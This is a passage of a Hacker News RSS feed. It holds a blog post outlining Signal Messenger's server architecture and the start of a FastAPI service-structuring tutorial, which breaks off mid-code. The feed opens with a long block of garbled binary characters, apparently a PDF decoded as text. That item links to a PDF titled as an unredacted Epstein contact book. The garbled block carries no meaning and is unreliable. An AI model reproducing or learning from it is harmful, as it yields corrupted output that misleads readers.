√äM√∫√ÑLQG¬¥‚Ñ¢√≠‚Äù¬§¬≠√§√ë¬®√Æ¬™√™≈∏‚Ä°S‚Ä†√Å%‚Äû9¬ª4¬º‚Äû√ÖÀÜ√¢&lt;≈íqJuHB¬±[ [√ô}ÔøΩ√≤Ph;¬ß√à√ΩAr.¬≤T‚Ä¶√π∆íC¬∫6¬°¬°√º√®√áLZIl¬º7¬∂√≠√ã‚Äù√ât&nbsp;≈ì√í&nbsp;‚Ä°√Å7"√¥Y¬¶√†,L‚Äò¬º‚Äú¬∫√ã6√â√ò¬ª¬®¬π∆í¬±√á‚Äö‚Äì√†‚Äò^∆í‚Äú√¶¬®≈∏NY≈∏√Ä‚Ç¨B‚Ä†
|*}≈ì:;D√ØS¬π
√∂¬∂√¥0≈æ8^¬ø√π√û√†√æ√öx≈íR¬¥¬´{√∑‚Äú√ê[GZy‚Ä∫PVD√ó9TB√∞√á ¬æ‚Ä¢DÀÜ√•a√•√ô√ÆM¬∂√´¬æ√Ä6√¶¬™√ªBL√©ÀÜ¬™√ã¬¶√ã√î√í‚ÄòG¬•C¬Ø%V‚Ä†iy¬£'B√æj√¶√ä√≥&lt;√ú√®YlM√ó9¬¨"≈°√ÉfNpl¬™‚Äô≈ì)¬≤	√æ}¬©√ç"√∞√ä√ëcJ3fIIÔøΩ√¶
	√π√º&nbsp;U√ßk,√í 7ÔøΩ√Ä√á}'¬º√ô√ì√π]¬Ω0√ëiw¬£v¬¶{¬ª√é¬§√ÑqC#z√ÑN{t¬≥.¬ºt¬ÆÀú∆í√ç¬πp‚ÄìÔøΩ_√†¬¨*&gt;‚Ä¶¬∫√â√ö√ê¬¶i√ü√¶2¬¥'¬¥ d`√ä≈ì,√ï‚Ä†√ó&nbsp;≈í√Ö√Øpn:.‚Ä°‚Ä∫)kW‚ÄùÔøΩ{√ç√â√ó√á*¬§I¬∏s/tR√ê¬∑√´T√£¬¨√ú√±√µ√Ö)2&lt;√æ5√•5+‚Ñ¢√Ø^i¬∞,¬™n√ø¬ß√Ü9QaUEp√ùO%~‚Äò‚Äî√ÇD√∑WÔøΩn¬ª¬≤√¨XC√π}%f&gt;¬ª√¢=w√ì√µ√ì‚Ä¶√û8SS¬¢‚Ä¶hJ‚Ä¢‚Äì√ª%√á\√Ω√Ä√£R√∫L¬Ω√ã¬∂XÔøΩ;c√ô√ìÔøΩv√æxBf4√®√Ñ√£Q¬±√∫u√´K√Ö]√ó/√ÖÔøΩ{√¢:√πw√è√≤√é=≈í¬∞‚Ç¨¬∫¬©√ªÔøΩQ‚Äû‚Äö√∞-	¬™√™m√Ø¬∑‚Äπ√é‚Ç¨~√å√ä QU√å√ÅM¬ß√ô‚Ñ¢&gt;√ö‚Ä†RA√ã`6a‚Äú ‚Äì`¬¶ZO√¥≈Ω≈ΩE√üG√πe¬§≈æJo√Ö&gt;‚Ä¢D¬∂√ù‚Ä∞√Ä H$c√≤√èO√Æg√£¬ø¬µ'X<d√ñ-√ú*√âl√™√ä√Ñ√¥_\≈†¬∞√é√â+√ö(¬® ¬£≈Ωw√ÇÔøΩ√æ√ç√â√â¬Ωd√æ≈°:¬∂7}#√Øu√µ%ÔøΩ≈íiÔøΩ'¬π√†="" f≈æÔøΩnzc√ßÔøΩ√ü;√ª¬´Àú√∂ÔøΩ¬∏i¬®0¬∫s√≠<ÔøΩ¬®¬¶¬≥!&j√à‚Äûus‚Ä∞¬∑¬µ)="" .√Ç.g.‚Äô¬ª√≤√∂#!#√ú¬™√ù√Ω¬Æ‚Äù¬©≈Ω‚Äî_@u√íbm√§o√Ω‚Ä∞w√çb‚Äì‚ÄîÔøΩ‚Äö`ÔøΩÔøΩ‚Ä°;¬µai‚Äù√ìy¬π√ò√≠!po"¬≥¬§nb√•¬≠√≠5√òg4&√∞e√•√ê√ß√ûl7%¬©¬£¬†√ö3ÔøΩm0√∏'¬¢¬¶¬≠‚Ç¨√±√Æ\q√µh¬æ≈Ω≈∏b√º¬æ‚Ç¨="" ks¬®o¬¢‚Ä∞¬™√â="" √¢√ì}≈íy≈æ¬£m1¬´c√è≈∏m≈ì√ö1ewÔøΩn√±ÔøΩt√±x"¬∂g≈°√µ¬¢="" @√≤b¬µb¬£‚Ñ¢w‚Ä∞c√é√Çl√™,≈í8√ë‚Äô√ü√∂dp≈∏ÔøΩw¬ø√Ñ¬§√º¬•¬£¬≤f√Ö¬™4¬ª¬¢r%h.≈í≈Ω√∑3hÔøΩ.k√Ω¬∂√ò¬∑f∆í≈æ√î¬≠√ç*fn√Ö#√Ü≈∏¬π¬∏'7√É≈í@r`√ú~‚Ä¶√Ö√äl√ê√†√†c√ì:fÔøΩu="" y¬∫¬Æ{√óz‚Ä†w[√©ÔøΩ≈ìy¬µ-y√¨Àú:o¬µ‚Ä∫√¢w√´¬ª="" ÔøΩ¬´4ÔøΩ√ª√ó¬´¬†√≤-ÔøΩ="" √°¬ªr√µ%u(√¥¬£%¬øo¬∫√É¬∑sÔøΩ¬≠5¬æ√æ¬≥ÔøΩ√µ√ª√Ωm‚Ä¶¬∞√°`¬∏ÀÜ√¨¬≤w√¢ÔøΩ¬•√ü¬†√ñ‚Ä¢≈∏¬∏u\√¨p~√ê¬ß~8'√Ñ¬¢√û|s‚Ä°‚Ç¨¬ª√ßÀú√≤_|2¬≤≈∏a¬£√∞‚Äì√§y‚Äù≈í="" u‚Ä°√Ä√µ√î{q¬¶k√µ¬•ÔøΩ√∫¬¶!‚Äò|y√¨ÔøΩ‚Äî√∏(f3‚Äú¬µ¬∂x¬®n√¥1‚Äô√Ö‚Äπ√á‚Ä¶m√µ√Ø√Ω√ëjr2‚Äìd√ò3¬ß‚Äö¬©z58‚Ä∞√öm¬Æ="" zn&¬•~¬π√à√ød√î_f¬£√Ü¬ºe√∏|¬µ√øi¬µ√î}s√ñ!¬∞="" ke√∂√É9√¨="" √ä¬±h√≠‚Äì√ØÔøΩk‚Ñ¢?√Ñe39√∫√´#√ì,5√µ!¬ø¬≥¬§√¥iu√É≈í(o√Çq√å√ô\¬©¬∫√Å‚Äô√∏q‚Ä¢‚Ä∫m√Ç="" t#;34d~√±ÔøΩ¬≠√£nn‚Ä†]√©<6="√ó≈†‚Ä°P√àh√¨9‚ÄìÀÜKDK¬§,√°¬®A.s¬™" ‚Ä∞√ã√ôb√Å¬ßho2√Æ&‚Äö(√¨5="" √Ö√ò‚Ä†≈∏‚Äôy¬¨√ºn√Å‚Äπv√≠√≥‚Äú√ø≈Ω5ÔøΩ"√π√ú‚Äìq}ÔøΩl√í√´,‚Ç¨¬µ√ï¬µ√É≈∏="" √î√ô√ô:¬Æ[!="" ¬•="" √∑t¬∏)s&¬Æ≈∏√Æ^3√àp√û¬≠ÔøΩ="" $i‚Äô√ø¬º√ôt¬∏¬Æ√ûr‚Äú="" t¬©hslr_s√ù¬§√Çk="" ¬°¬§e√è√õ‚ÄûÔøΩa√ä√æÔøΩpe‚Äì1≈í√éd¬π="" ¬≤√Çe¬∫3ÔøΩ¬§√≤q¬≤ÔøΩÔøΩ≈†√å√É¬æÔøΩ‚ÄúÔøΩb√ï≈Ω√ì√É¬∂¬±i{"√é√∏¬©u="" m'√ä¬•√Ω√ª√å‚Ä†√£√òf√∫¬™u¬Æ‚Ä∞¬§z¬ø√ã≈Ω√â√´o^v‚Äì√øm√ñ√ü√í√Ü√ös,‚Ä†wg¬ø√á√∑sr.√¶ÔøΩ¬¥Àúk$8‚Ä¶u\o¬¥√•]¬£_√•√ì√ô√øe√ä√Æ√§√º≈∏√Ü@~ÔøΩ¬∂√π%c√è_(¬ß√≠√ÇÔøΩ√æ√®ÔøΩÔøΩj√∞√£jk[¬°∆í="" √∏‚Ä¢m:¬æ¬¥fc7√≠√Ö‚Äù√£¬≤¬Ø‚Äîs≈ì<.√¥ÔøΩ√á¬æ;9√é≈°7="" ‚Äì‚Ä∞√†¬†k¬™¬ß%="" ;%&e+z!ÔøΩp^s]n]√Ωs√ó√î¬Ω¬¶y√ê¬†ÀÜ√ñ1dg‚Ä∫="" iw√æl‚Äû¬¨="" $¬™√è√ú¬º\≈Ωxa^7¬∑z√æ~xk√•e√ç√Öy¬∞‚Ä°!√ìÔøΩux√å≈ím`:¬°¬ª√à√ßcx√æ√∏="">√é√á‚Ñ¢√Ø√ß‚Ä¢w≈í6‚Äù'√∫0√™‚ÄúI‚Ä∞≈°¬£√∂Y&lt;[√É¬ª¬•√∞¬¢≈Ω‚ÄîL√ù&lt;	√§7√ì¬≠{¬°I√àz9¬Ø√•W{¬•#3V√§√≥Gv√ì√ë¬∑√ì*f¬¨0Z?√å√Æ√Ö≈°ÔøΩ\o¬®6√•ÀÜ√ô%√â√à√ò√∑√ç	G¬°&gt;S√Ü√∏TN¬±‚Äö¬∞√û√ïÀú{¬∫‚ÄùW‚Äì√à<!--?.¬•√™`‚Äú√Ñ√ë¬®√Ñl√†√ß≈ì√ö@≈°≈ΩD‚Äùx[\Iw¬¥}‚Äì√û¬≥$≈ìbÔøΩ√ü9¬∏`√≤√•wS¬°√¥√∑√§6~√≠ÔøΩGm+;-->¬±Y√°!.∆í√¶√ºS	¬≥W&nbsp;√Ñ1 √ù/¬º√¥≈°√øZ]¬º√¢"‚Ñ¢5√±√´O8F¬π‚Äî√≥b√£x√≤Àú√≤UA¬¶.ei√®3#√π^√ÜZ√îL‚ÄòVt≈∏√©R5-z!O¬ß1H√™P≈Ω√Ç¬ª6√≠:√á√úJ¬°≈†√Ö¬§`+√û$¬®ih¬™∆í‚Äôb√Æ√à√ä=U¬ß¬∞$q¬Æ5 ¬£ÀÜ"√∂R&nbsp;.‚ÄπR≈∏√§√ª3¬©‚Ä†√Ω√Ée≈°t.√®A#%&nbsp;√ó√ø.}W√¶j≈ΩDÔøΩ¬©√ä‚Äî!zC|√±√ôÀú'`DFS6‚Ä†√±O=√†¬∑u√°^‚Ä¶¬ªL√ÉI¬∑fb¬¥^;Àú4¬£‚Äö.d≈°√ùH2¬¢√≠√≤¬•√∞‚Äî¬™√£zb√êU~¬≠√Ä	∆í¬¢=‚Äò≈Ω¬º¬π‚ÄòÔøΩ¬Æ√∏+b¬¢¬´(H\|¬∫l3k¬∞u%4M≈í‚Äò√ì‚Ä∞6\R;
}ÔøΩ√ø'¬®≈ì√∂√∑t?√ø√¥P¬µ√Ü¬¥Jf^%	ÔøΩv√ç√æ]ic3=‚Äì¬∞¬≤ÀÜ	`=+√∞¬ø¬≥≈Ω¬≥6c8√î√à‚Ç¨*¬Æ√¢\V¬°{√Ø√Ñ√¢√ëq¬°¬®‚Äû3√≠U√≠√Ä≈°√öA‚Äû√û‚Ä∫m!(_%\H^√†√•¬∫D√ÉR√Ñ√é¬¶:‚Äû'N.¬æ√≤¬®¬•‚ÄπÔøΩ[US√ï‚Ä†ÔøΩK√•i√úo.¬∫7‚Äög|√è&nbsp;'√ë√î√≥&gt;R√æ√ø4=}√ê‚Ä†D√¥h√êv√î¬Ω:√∂x4h√≤;¬Ø¬≠Àú√íe√π√π¬≤√†E‚Äû√µ√ÆJ‚Ä¢\)√≠¬≠‚Ä†√î0¬π¬°√ì?8√è¬∏\√±‚Äì¬£√õ≈Ω¬π4√ä‚Äù√§{b≈ì√ú‚Äî√Æ‚ÄúQ¬∂?X≈í√Ç√Æd√ær{√≥P√ì'P¬´√ß‚Äìp¬ª¬∑√ô¬ΩuT^‚Ä¢|_√î≈°7√∫‚Äù¬≤√≤ah¬¨4√∞¬æ√ù¬Øn√øY"¬¨W√õZ√é√µ¬®l&nbsp;]√ß¬µ‚Äö|√Å√≥√Ω√Ω√Ω√ª√∂¬º≈†k√ê‚Ä†¬±ÔøΩ√©‚Äπ#¬¨]	√ñ√æ√≥√ì5√ª√ç√ë√ò9‚Äì=
‚Äò2Àú3(¬±√û√ú&gt;e√äQ;¬ø√à	√º√É√åX√ì¬æ√â‚Ä¢¬®‚ÄöQ=‚Äú√ój√ût√â¬§√µ}√á-cW&gt;&amp;xx¬∞¬±∆í8]S,‚Äú√ì√©¬¨}¬ßy2=√´]49*qw!√àT{_3√®√ßKq¬ß≈°√¢(√™&nbsp;Vm{TwL¬ª‚Ä¶</d√∂-√º*√©l√™√™√§√¥_\≈°¬∞√Æ√©+√∫(¬®></x√°idÔøΩn=f√´d√Ω¬®√≥></hg¬´\√∞></d<√Æjtd√§√∞$w¬†%√≤\ms¬ß0¬ºa√≤¬™7e‚Ñ¢¬≤l></jp√§√≠w‚Äù<√¢p></v¬±¬¨giu‚Ä¢-_√ór√∫#[√Ω√ø=ÔøΩ¬π√≤s‚Ä¢√¢)e√Ω√¶y√∑7<‚Ä∞√∏¬¨l¬±√¥"f></q¬§√°√∫r∆í‚Ä†√¨√™ni√§‚Ä¶√¢j!b≈ì></t√¨√æ√æn√Ω6></m¬£-dn¬§,r¬¶√´¬§]:√π0√ü√¥√©(‚Ç¨`^fcy‚Äù&√©ia0√≤‚Äûv9u√∏√ºwc√∂¬©ÔøΩ;‚Ä∫√∑nf¬≠¬ø√§‚Äû~h√ªv√¢¬ªif∆í√≤></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://spidercatweb.blog/wp-content/uploads/2019/08/Jeffrey-Epsteins-Little-Black-Book-unredacted.pdf">https://spidercatweb.blog/wp-content/uploads/2019/08/Jeffrey-Epsteins-Little-Black-Book-unredacted.pdf</a></em></p>]]>
            </description>
            <link>https://spidercatweb.blog/wp-content/uploads/2019/08/Jeffrey-Epsteins-Little-Black-Book-unredacted.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-25797773</guid>
            <pubDate>Fri, 15 Jan 2021 23:06:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Signal Messanger Architecture]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25797686">thread link</a>) | @aleyan
<br/>
January 15, 2021 | https://sorincocorada.ro/signal-messanger-architecture/ | <a href="https://web.archive.org/web/*/https://sorincocorada.ro/signal-messanger-architecture/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
						<p><strong>Introduction<br>
</strong><br>
<a href="https://signal.org/">Signal</a> is an end-to-end encrypted communications application for Android and iOS similar to WhatsApp but open source. It uses the TCP/IP (Internet) to send one-to-one and group messages, which can include text, files, voice notes, images and videos, and make one-to-one voice and video calls. For user identification standard cellular mobile numbers are used.</p>
<p><img src="https://sorincocorada.ro/wp-content/uploads/2018/03/SignalArchitecture-1.png" alt="" width="1123" height="794" srcset="https://sorincocorada.ro/wp-content/uploads/2018/03/SignalArchitecture-1.png 1123w, https://sorincocorada.ro/wp-content/uploads/2018/03/SignalArchitecture-1-300x212.png 300w, https://sorincocorada.ro/wp-content/uploads/2018/03/SignalArchitecture-1-768x543.png 768w, https://sorincocorada.ro/wp-content/uploads/2018/03/SignalArchitecture-1-1024x724.png 1024w" sizes="(max-width: 1123px) 100vw, 1123px"></p>

<p>The main system component is the Signal-Server which is maintained by Open Whisper Systems. The source code is available on GitHub (https://github.com/signalapp/Signal-Server) only for audition purposes without providing additional documentation about on premises installations. In the following sections I will provide some information about the system components and their interconnections.</p>
<p><strong>System components</strong></p>
<p><em>Signal-Server ‚Äì</em> is the central element of the Signal Messenger ecosystem, being constantly developed by Open Whisper Systems. It manages the registration of new accounts, stores and distributes the public keys of the clients, relays and temporarily stores&nbsp; the end-to end encrypted messages, enforces rate limits in order to avoid denial of service attacks and provides pre-signed URLs to the mobile client for uploading files. Signal-Server is entirely written in Java; source code is available at the following URL: https://github.com/signalapp/Signal-Server .&nbsp; An additional <a href="https://www.postgresql.org/" target="_blank" rel="noopener">PostgreSQL</a> database and<a href="https://redis.io/" target="_blank" rel="noopener"> Redis</a> NoSQL object store are needed in order to run the Signal-Server. The configuration is stored in a yml file (at a first glance it seems quite complex) and is passed as a command line argument to the java binaries. Before running Signal-Server the Push-Server must be up and running.</p>
<p><em>Push-Server</em> ‚Äì acts as a gateway between Signal-Server and Google Cloud Messaging / Apple Push Notification Service. It is entirely written in Java and the configuration is sored in a yml file which must be passed as an command line argument to the java binaries. Source code is available at&nbsp;https://github.com/signalapp/PushServer . Without the push service the App has to be permanently connected to the Signal-Server in order to receive the messages, thus reducing the battery life of the mobile device or the user hast manually check for new messages by opening the App.</p>
<p><em>STUN/TURN Server ‚Äì&nbsp;</em> is a VoIP media traffic NAT traversal server and gateway. It is used for establishing voice and video calls. For this component you can use a standard On-premises or Cloud TURN implementation, such as Linux Coturn (https://github.com/coturn/coturn) which is available as a standard package on the majority of Linux distributions. If you do not need voice/video calls this component can be omitted. <em><br>
</em></p>
<p><em>Signal App</em> ‚Äì is the only visible part to the end user. It&nbsp; is developed and&nbsp; maintained by Open Whisper Systems. At the time of writing there is a Android and an iOS version. A desktop (Linux, Windows, Mac ) version is also available but it lacks registration and calling support, being more like an extension of the mobile App for desktop usage.</p>
<p><em>Twilio</em> ‚Äì is a cloud communications platform. In this scenario it allows the Signal-Server to make phone calls and send&nbsp; text messages using its web service APIs. It is used only during the registration phase to confirm the users mobile phone number. Twilio‚Äôs services are accessed over HTTP and are billed based on usage.</p>
<p><em>Amazon S3 (Simple Storage Services)</em> ‚Äì is a web service offered by Amazon Web Services (AWS). It is used to exchange encrypted files between the Signal clients. In contrast to the text messages which are relayed through the Signal-Server the files are temporarily stored using an external service. The protocol works as follows: the Signal client request an URL from Signal-Server, the server computes a <a href="https://docs.aws.amazon.com/AmazonS3/latest/dev/PresignedUrlUploadObject.html">pre-signed URL</a> having a limited validity and sends it to the client, the client uploads the encrypted file to Amazon S3 and then sends the link to its peer. Amazon S3 services are accessed over HTTP and are billed based on usage. If you do not need file transfers this component can be omitted.</p>
<p><em>Google Cloud Messaging (GCM)</em> ‚Äì is a mobile notification service developed by Google that enables Signal-Server to send notification data to Signal Apps that target the Android Operating System. GCM is a free service ant it is accessed over HTTP.</p>
<p><em>Apple Push Notification Service (APNs)</em> ‚Äì is platform notification service created by Apple Inc. that enables the Signal-Server to send notification data to Signal Apps installed on Apple devices. APNs doesn‚Äôt cost anything.</p>
<p>In addition to the end-to-end encryption, the transport between the Signal App and the Signal-Server is secured using TLS and <a href="https://www.owasp.org/index.php/Certificate_and_Public_Key_Pinning">certificate pinning</a>. The Signal-Server implements a API protocol for communicating with the Signal Apps which is available at https://github.com/signalapp/Signal-Server/wiki/API-Protocol (document might be outdated).</p>
			<!-- <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
			xmlns:dc="http://purl.org/dc/elements/1.1/"
			xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/">
		<rdf:Description rdf:about="https://sorincocorada.ro/signal-messanger-architecture/"
    dc:identifier="https://sorincocorada.ro/signal-messanger-architecture/"
    dc:title="Signal Messanger Architecture"
    trackback:ping="https://sorincocorada.ro/signal-messanger-architecture/trackback/" />
</rdf:RDF> -->
						
		</div></div>]]>
            </description>
            <link>https://sorincocorada.ro/signal-messanger-architecture/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25797686</guid>
            <pubDate>Fri, 15 Jan 2021 22:59:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Implementing FastAPI Services ‚Äì Abstraction and Separation of Concerns]]>
            </title>
            <description>
<![CDATA[
Score 63 | Comments 5 (<a href="https://news.ycombinator.com/item?id=25797140">thread link</a>) | @jdnier
<br/>
January 15, 2021 | https://camillovisini.com/article/abstracting-fastapi-services/ | <a href="https://web.archive.org/web/*/https://camillovisini.com/article/abstracting-fastapi-services/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-v-3d5c50e8=""><p data-v-3d5c50e8="">This article introduces an approach to structure FastAPI applications with multiple services in mind. The proposed structure decomposes the individual services into packages and modules, following principles of abstraction and separation of concerns. The code discussed below can also be studied in its entirety in a dedicated companion GitHub repository.</p>

<h2 id="fastapi--building-high-performing-python-apis" data-v-3d5c50e8="">FastAPI ‚Äì Building High-performing Python APIs</h2>
<p data-v-3d5c50e8=""><a href="https://fastapi.tiangolo.com/" rel="nofollow noopener noreferrer" target="_blank" data-v-3d5c50e8="">FastAPI</a> is a fast, highly intuitive and well-documented API framework based on <a href="https://www.starlette.io/" rel="nofollow noopener noreferrer" target="_blank" data-v-3d5c50e8="">Starlette</a>. Despite being relatively new, it's gaining <a href="https://star-history.t9t.io/#tiangolo/fastapi" rel="nofollow noopener noreferrer" target="_blank" data-v-3d5c50e8="">strong adoption</a> by the developer community ‚Äì it is even already being adopted in production by corporates like <a href="https://netflixtechblog.com/introducing-dispatch-da4b8a2a8072" rel="nofollow noopener noreferrer" target="_blank" data-v-3d5c50e8="">Netflix</a> and <a href="https://github.com/tiangolo/fastapi/pull/26" rel="nofollow noopener noreferrer" target="_blank" data-v-3d5c50e8="">Microsoft</a>.</p>
<p data-v-3d5c50e8="">Following the <a href="https://en.wikipedia.org/wiki/Unix_philosophy" rel="nofollow noopener noreferrer" target="_blank" data-v-3d5c50e8="">UNIX philosophy</a> of <em data-v-3d5c50e8="">"doing one thing, and doing it well"</em>, separating parts of the application according to their task improves code readability and maintainability; ultimately reducing complexity. The main benefits of structuring applications in this way:</p>
<p data-v-3d5c50e8=""><strong data-v-3d5c50e8="">Separation of concerns</strong> ‚Äì Decomposing the application into modules performing a single job. This allows accepting requests (top down: controller ‚Üí service ‚Üí data access) and returning responses (bottom up: data access ‚Üí service ‚Üí controller) with a clear separation of what particular functionality should be implemented in which particular module, reducing cognitive load for development.</p>
<div data-v-220acfa8="" data-v-3d5c50e8=""><p><img src="https://d33wubrfki0l68.cloudfront.net/6c6e6d1a9a2252c24c72049f74382abee765095c/9408a/_nuxt/img/request-response.df4b985.jpg" width="100%" height="" alt="Request-Response Flow across Application Layers" data-v-220acfa8=""></p><p data-v-220acfa8="">Request-Response Flow across Application Layers</p></div>
<p data-v-3d5c50e8=""><strong data-v-3d5c50e8="">Abstraction</strong> ‚Äî Components of the application are designed in a reusable way. For instance, <code data-v-3d5c50e8="">ServiceResult</code> is implemented as a generic outcome of a service operation (which may be successful and return a response, or unsuccessful and raise an exception) able to be used by all services of the app, keeping code <a href="https://en.wikipedia.org/wiki/Don%27t_repeat_yourself" rel="nofollow noopener noreferrer" target="_blank" data-v-3d5c50e8="">DRY</a>.</p>
<div data-v-220acfa8="" data-v-3d5c50e8=""><p><img src="https://d33wubrfki0l68.cloudfront.net/fc6bd09df8db15e783bd11117eba8003350f04cc/465f4/_nuxt/img/directory-structure.0c63d71.jpg" width="100%" height="" alt="Directory Structure Overview" data-v-220acfa8=""></p><p data-v-220acfa8="">Directory Structure Overview</p></div>
<p data-v-3d5c50e8="">The granular nature of namespacing allow to distinguish parts of the application, e.g., routes versus business logic belonging to a particular service ‚Äì grouping similar tasks together, while keeping distinct parts separated. Four principal packages are needed. For each service, one module is added to these four packages. For instance, a service called <em data-v-3d5c50e8="">"Foo"</em> requires the following modules (discussed in detail below):</p>
<div data-v-3d5c50e8=""><pre data-v-3d5c50e8=""><code data-v-3d5c50e8=""><span data-v-3d5c50e8=""><span data-v-3d5c50e8="">./routers/  foo.py </span><span data-v-3d5c50e8=""># Router instance and routes</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">./services/ foo.py </span><span data-v-3d5c50e8=""># Business logic (including CRUD helpers)</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">./schemas/  foo.py </span><span data-v-3d5c50e8=""># Data "schemas" (e.g., Pydantic models)</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">./models/   foo.py </span><span data-v-3d5c50e8=""># Database models (e.g., SQLAlchemy models)</span></span></code></pre></div>
<p data-v-3d5c50e8="">The four principal packages are complemented by two generic packages which contain application-specific (and not service-specific) functionality, such as configuration or utility functions.</p>
<h2 id="controller-layer--routes" data-v-3d5c50e8="">Controller Layer ‚Äì Routes</h2>
<p data-v-3d5c50e8="">Within <code data-v-3d5c50e8="">main</code>, the application is instantiated and all routers are included. Additionally, middlewares and/or exception handlers are implemented. The example application discussed below is based on a service called <code data-v-3d5c50e8="">Foo</code>, which requires a number of routes. To handle custom exceptions occurring at the service layer, as instances of class <code data-v-3d5c50e8="">AppExceptionCase</code>, a respective exception handler is added to the application.</p>
<div data-v-3d5c50e8=""><pre data-v-3d5c50e8=""><code data-v-3d5c50e8=""><span data-v-3d5c50e8=""><span data-v-3d5c50e8="">1</span><span data-v-3d5c50e8=""># ...</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">2</span><span data-v-3d5c50e8="">from</span><span data-v-3d5c50e8=""> fastapi </span><span data-v-3d5c50e8="">import</span><span data-v-3d5c50e8=""> FastAPI</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">3</span><span data-v-3d5c50e8="">from</span><span data-v-3d5c50e8=""> routers </span><span data-v-3d5c50e8="">import</span><span data-v-3d5c50e8=""> foo</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">4</span><span data-v-3d5c50e8="">app </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> FastAPI()</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">5</span><span data-v-3d5c50e8="">@app.exception_handler</span><span data-v-3d5c50e8="">(AppExceptionCase)</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">6</span><span data-v-3d5c50e8="">async</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">custom_app_exception_handler</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">request</span><span data-v-3d5c50e8="">,</span><span data-v-3d5c50e8=""> e</span><span data-v-3d5c50e8="">):</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">7</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">await</span><span data-v-3d5c50e8=""> app_exception_handler(request, e)</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">8</span><span data-v-3d5c50e8="">app.include_router(foo.router)</span></span></code></pre></div>
<p data-v-3d5c50e8="">Routers and their routes are defined in modules within the <code data-v-3d5c50e8="">routers</code> package. Each route instantiates the respective service and passes on the database session from the request dependency. Handled by <code data-v-3d5c50e8="">handle_result()</code>, the service result (either the requested data as the result of a successful operation, or an exception) is returned. In case of an exception, instead of (and before) returning any response, the app exception handler in <code data-v-3d5c50e8="">main</code> picks up handling the exception and returns a response.</p>
<div data-v-3d5c50e8=""><pre data-v-3d5c50e8=""><code data-v-3d5c50e8=""><span data-v-3d5c50e8=""><span data-v-3d5c50e8="">1</span><span data-v-3d5c50e8="">router </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> APIRouter(</span><span data-v-3d5c50e8="">prefix</span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8="">"/foo"</span><span data-v-3d5c50e8="">)</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">2</span><span data-v-3d5c50e8="">@router.post</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">"/item/"</span><span data-v-3d5c50e8="">, </span><span data-v-3d5c50e8="">response_model</span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8="">FooItem)</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">3</span><span data-v-3d5c50e8="">async</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">create_item</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">item</span><span data-v-3d5c50e8="">:</span><span data-v-3d5c50e8=""> FooItemCreate</span><span data-v-3d5c50e8="">,</span><span data-v-3d5c50e8=""> db</span><span data-v-3d5c50e8="">:</span><span data-v-3d5c50e8=""> get_db </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> Depends()</span><span data-v-3d5c50e8="">):</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">4</span><span data-v-3d5c50e8="">    result </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> FooService(db).create_item(item)</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">5</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> handle_result(result)</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">6</span><span data-v-3d5c50e8="">@router.get</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">"/item/</span><span data-v-3d5c50e8="">{item_id}</span><span data-v-3d5c50e8="">"</span><span data-v-3d5c50e8="">, </span><span data-v-3d5c50e8="">response_model</span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8="">FooItem)</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">7</span><span data-v-3d5c50e8="">async</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">get_item</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">item_id</span><span data-v-3d5c50e8="">:</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">int</span><span data-v-3d5c50e8="">,</span><span data-v-3d5c50e8=""> db</span><span data-v-3d5c50e8="">:</span><span data-v-3d5c50e8=""> get_db </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> Depends()</span><span data-v-3d5c50e8="">):</span></span>
